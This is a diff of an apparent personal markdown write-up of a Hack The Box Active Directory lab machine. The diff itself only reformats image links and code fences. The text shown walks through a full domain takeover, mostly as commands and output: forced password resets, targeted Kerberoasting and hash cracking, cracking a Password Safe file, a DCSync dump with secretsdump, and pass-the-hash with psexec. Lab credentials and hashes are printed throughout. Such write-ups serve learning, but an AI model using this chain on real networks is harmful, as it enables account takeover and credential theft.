@@ -86,11 +86,11 @@ bloodhound --disable-gpu # as it causes issues in my VM
 	- We upload the files. And under Analyze we select "Shortest Paths to Unconstrained Delegation Systems.", Alternatively, we can just search for Olivia, but here we can see a decent map of a good part of the network. We check other options too to get a better idea.
 ### Lateral Movement till we get user flag
 - We find user Olivia and mark user as owned.
-	![[Pasted image 20250411143650.png]]
+	![Pasted image 20250411143650.png](../Attachments/Pasted%20image%2020250411143650.png)
 - Then Once we select Olivia, under Node Info we go to "Outbound Object Control" and select "First degree Object Control", to find user Michael, which olivia has GenericAll privileges on it, i.e, has full control.
-	![[Pasted image 20250411214502.png]]
+	![Pasted image 20250411214502.png](../Attachments/Pasted%20image%2020250411214502.png)
 	- If we rightclick on GenericAll > Linux we can see how to exploit.
-		![[Pasted image 20250411214938.png]]
+		![Pasted image 20250411214938.png](../Attachments/Pasted%20image%2020250411214938.png)
 		- We see we can force change Michael's password:
 ```
 net rpc password "Michael" "Password@123" -U "administrator.htb"/"Olivia"%"ichliebedich" -S "dc.administrator.htb" #Can also use administrrator.htb instead of dc.adminsitrator.htb
@@ -126,11 +126,11 @@ vi michael.hash # Copy hash here
 john michael.hash --wordlist=/usr/share/wordlists/rockyou.txt
 ```
 			- We also see a Shadow Credential attack using pywhisker (https://github.com/ShutdownRepo/pywhisker.git)
-```bash
+```
 sudo python pywhisker.py -v -d 'administrator.htb' -u 'olivia' -p 'ichliebedich' --target 'michael' --action 'add'
 ```
 				- We then had to pass the command it gave us using the certificate it generated but it failed:
-```bash
+```
 sudo python3 PKINITtools/gettgtpkinit.py -cert-pfx R5RcMwwm.pfx -pfx-pass pvMWabNnb9vhzg8QbZqo administrator.htb/michael R5RcMwwm.ccache
 
 
@@ -141,7 +141,7 @@ minikerberos.protocol.errors.KerberosError:  Error Name: KDC_ERR_PADATA_TYPE_NOS
 - We then add Michael as Owned in BloodHound.
 	- Then like before,  we go to "Outbound Object Control" and select "First degree Object Control" to find user Benjamin.
 		- we see we can once again force change a password like earlier:
-```bash
+```
 net rpc password "Benjamin" "Benjamax@123" -U "administrator.htb"/"Michael"%"Password@123" -S "administrator.htb" # or -S dc.administrator.htb if added in /etc/hosts as it's more correct
 ```
 			- We check using smbclient like earlier and it works.
@@ -151,7 +151,7 @@ net rpc password "Benjamin" "Benjamax@123" -U "administrator.htb"/"Michael"%"Pas
 		- We do know user Emily and Ethan are High Value targets from looking at the network and also checking options like Shortest path to High Value targets etc.
 			- We mark them as so.
 - On looking back at our nmap we attempt to ftp into the machine with all of the users with credentials we have and get a hit on Benjamin. We see a file to download and get it to our local machine.
-```bash
+```
 ftp 10.10.11.42
 > Username : Benjamin
 > Password : Benjamax@123
@@ -167,7 +167,7 @@ local: Backup.psafe3 remote: Backup.psafe3
 ```
 - On searching google "psafe3" the first two links point to Password Safe tool and a hashcat mode.
 	- We try to crack this file.
-```bash
+```
 hashcat -m 5200 Backup.psafe3 /usr/share/wordlists/rockyou.txt # -o safepass to save file
 
 --OR--
@@ -185,20 +185,20 @@ tekieromucho     (Backu)
 	- We download the Password Safe tool:
 		- https://github.com/pwsafe/pwsafe/releases?q=non-windows&expanded=true
 			- I downloaded via the SourceForge link which was a deb file and then passed:
-```bash
+```
 sudo dpkg -i <file_name>
 ```
 				- There were some errors and then I ended up passing this which fixed the issue:
-```bash
+```
 sudo apt install --fix-broken
 ```
 	- We then either open Password Safe or pass the command to open the gui:
-```bash
+```
 pwsafe Backup.psafe3
 ```
 		- And then we enter the Master password.
 	- We see data of 3 people, one of them being one of our high value targets, Emily.
-		- ![[Pasted image 20250411172038.png]]
+		- ![Pasted image 20250411172038.png](../Attachments/Pasted%20image%2020250411172038.png)
 
 | Name            | Username  | Password                       |
 | --------------- | --------- | ------------------------------ |
@@ -206,7 +206,7 @@ pwsafe Backup.psafe3
 | Emily Rodriguez | emily     | UXLCI5iETUsIBoFVTj8yQFKoHjXmb  |
 | Emma Johnson    | emma      | WwANQWnmJnGV07WQN8bMS7FMAbjNur |
 - Since Emily is our high value target we attempt to use this credentials to login to our target.
-```bash
+```
 evil-winrm -u Emily -p UXLCI5iETUsIBoFVTj8yQFKoHjXmb -i 10.10.11.42
 ```
 	- We gain user flag.
@@ -214,7 +214,7 @@ evil-winrm -u Emily -p UXLCI5iETUsIBoFVTj8yQFKoHjXmb -i 10.10.11.42
 - We can now add Emily as owned in BloodHound.
 	- On checking First Degree Object Control for Emily we find Emily has Genericrite privilege on user Ethan, which is another high value target that is also the next step closer to domain admin access from the BloondHound network map.
 		- On checking how to abuse we pass the targetedkerberoast python command again to get the kerberos hash of ethan:
-```bash
+```
 python targetedKerberoast.py -v -d 'administrator.htb' -u 'Emily' -p 'UXLCI5iETUsIBoFVTj8yQFKoHjXmb'
 
 ---OUTPUT---
@@ -226,12 +226,12 @@ $krb5tgs$23$*ethan$ADMINISTRATOR.HTB$administrator.htb/ethan*$aa111bc71cc80fb0a7
 [VERBOSE] SPN removed successfully for (ethan)
 ```
 			- Note : It initially fails saying clock skew is too great so we fix it with:
-```bash
+```
 sudo ntpdate 10.10.11.42 # target ip
 ```
 			- I also try the shadow credential attakck listed in BloodHound but it didn't work similar as before with michael.
 		- We copy it into ethan.hash and attempt to crack it with john
-```bash
+```
 vi ethan.hash # copy hash here
 john ethan.hash --wordlist=/usr/share/wordlists/rockyou.txt
 
@@ -240,9 +240,9 @@ limpbizkit       (?)
 ```
 			- This time it works giving us credentials.
 - We mark Ethan as Owned and look at First Degree Object Control for him.
-	![[Pasted image 20250412003920.png]]
+	![Pasted image 20250412003920.png](../Attachments/Pasted%20image%2020250412003920.png)
 	- We see we can use DSync to gain privileges on Adminsitrator user:
-```bash
+```
 impacket-secretsdump 'adminitrator.htb'/'Ethan':'limpbizkit'@'dc.administrator.htb'
 
 ---OUTPUT---
@@ -268,7 +268,7 @@ DC$:1000:aad3b435b51404eeaad3b435b51404ee:cf411ddad4807b5b4a275d31caa1d4b3:::
 	- We get a dump of all the LM:NT Hashes of the system.
 		- We are interested in the Administrator user so we grab it's hash
 - We use Pass-the-Hash technique to psexec into the target machine as the administrator:
-```bash
+```
 impacket-psexec -hashes aad3b435b51404eeaad3b435b51404ee:3dc553ce4b9fd20bd016e098d2d2fd2e administrator@10.10.11.42
 >whoami
 >cd C:\Users\Admnistrator\Desktop
@@ -279,7 +279,7 @@ NT authority\system
 	- We gain Administrator privilege and grab the root flag.
 -----
 - I also attempt to crack the hash with hashcat:
-```bash
+```
 vi admin.hash # Copy "Administrator:500:aad3b435b51404eeaad3b435b51404ee:3dc553ce4b9fd20bd016e098d2d2fd2e:::"
 hashcat -a 0 -m 1000 admin.hash /usr/share/wordlists/rockyou.txt
 
